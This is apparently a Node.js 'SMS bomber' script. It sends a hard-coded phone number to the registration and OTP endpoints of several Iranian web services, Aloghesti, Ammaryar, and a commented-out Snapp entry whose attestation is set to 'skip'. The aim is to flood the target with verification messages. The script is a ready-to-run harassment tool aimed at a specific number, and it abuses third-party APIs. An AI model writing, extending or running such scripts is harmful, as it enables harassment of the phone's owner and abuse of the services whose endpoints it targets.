import axios from "axios";
import chalk from "chalk";

const PHONE_NUMBER = "9030422838";

const runService = async ({ name, headers, api, params }) => {
  try {
    await axios.post(api, params, {
      headers: headers,
      timeout: 8000,
    });

    console.log(chalk.green(`${name} ✓ Success`));
  } catch (err) {
    const status = err.response?.status || err.code || "Unknown";
    console.log(chalk.red(`${name} ✗ Failed (${status})`));
  }
};

const services = [
  {
    name: "Aloghesti",
    origin: "https://aloghesti.com",
    api: "https://api.aloghesti.com/api/v1/initial-user",
    params: { mobile: "0" + PHONE_NUMBER },
    enabled: false,
  },

  {
    name: "Ammaryar",
    origin: "https://ammaryar.ir",
    api: "https://ammaryar.ir/register_ajax",
    params: { mobile: PHONE_NUMBER, conf: 1 },
    enabled: true,
  },
];

(async () => {
  for (const service of services) {
    if (service.enabled) {
      await runService(service);
    }
  }
})();



























// {
//   name: "Snapp",
//     origin: "https://app.snapp.taxi",
//   api: "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp",
//   params: {
//   cellphone: "+98" + PHONE_NUMBER,
//     attestation: { method: "skip", platform: "skip" },
//   extra_methods: [],
// },
//   enabled: false,
// },